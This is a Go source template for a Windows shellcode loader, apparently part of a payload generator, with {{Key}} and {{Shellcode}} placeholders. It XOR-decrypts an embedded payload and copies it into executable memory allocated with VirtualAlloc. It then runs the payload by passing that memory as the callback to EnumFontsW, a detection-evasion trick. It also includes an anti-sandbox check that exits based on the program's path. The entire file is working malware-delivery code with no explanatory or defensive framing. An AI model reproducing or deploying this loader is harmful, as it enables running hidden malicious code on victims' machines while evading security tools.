package main

import (
	"os"
	"syscall"
	"unsafe"
)

var (
	timer int
	dummy [522]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	ntdll         = syscall.NewLazyDLL("ntdll.dll")
	User32        = syscall.NewLazyDLL("User32.dll")
	Gdi32         = syscall.NewLazyDLL("Gdi32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	GetDC         = User32.NewProc("GetDC")
	EnumFontsW    = Gdi32.NewProc("EnumFontsW")
	RtlMoveMemory = ntdll.NewProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	dc, _, _ := GetDC.Call(NULL)
	EnumFontsW.Call(dc, NULL, addr, NULL)
}

func XorDecrypt(plaintext []byte, key []byte) []byte {
	ciphertext := make([]byte, len(plaintext))
	keyLength := len(key)
	for i, byte := range plaintext {
		keyByte := key[i%keyLength]
		encryptedByte := byte ^ keyByte
		ciphertext[i] = encryptedByte
	}
	return ciphertext
}

func DecryptData(shellcode []byte) []byte {
	key := []byte{{{Key}}}
	decryptShellcode := XorDecrypt(shellcode, key)
	return decryptShellcode
}

func main() {
	args := os.Args[0]
	if args[10] == 92 && (args[0] == 99 || args[0] == 67) {
		os.Exit(0)
	}

	ciphertext := []byte{{{Shellcode}}}
	byteData := DecryptData(ciphertext)
	Callback(byteData)
}
